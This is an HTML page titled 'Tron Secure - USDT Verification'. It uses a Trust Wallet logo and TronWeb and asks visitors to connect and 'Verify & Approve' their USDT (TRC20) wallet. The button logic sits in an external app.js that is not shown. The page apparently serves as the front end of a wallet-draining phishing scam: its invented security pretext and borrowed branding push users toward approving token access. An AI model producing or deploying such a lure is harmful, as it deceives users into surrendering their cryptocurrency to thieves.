<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron Secure - USDT Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #121212; color: white; text-align: center; padding: 50px 20px; }
        .container { max-width: 400px; margin: auto; background: #1e1e1e; padding: 30px; border-radius: 20px; border: 1px solid #333; }
        .btn-connect { background-color: #0085ff; color: white; border: none; padding: 15px; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; font-size: 16px; }
        .status-msg { margin-top: 20px; font-size: 14px; color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" width="60" alt="Logo">
    <h2>Secure Approval</h2>
    <p>Please connect and verify your USDT (TRC20) wallet to proceed.</p>
    
    <button class="btn-connect" id="btn-approve">Verify & Approve</button>
    
    <div class="status-msg" id="status">Ready to connect...</div>
</div>

<script src="app.js"></script>

</body>
</html>
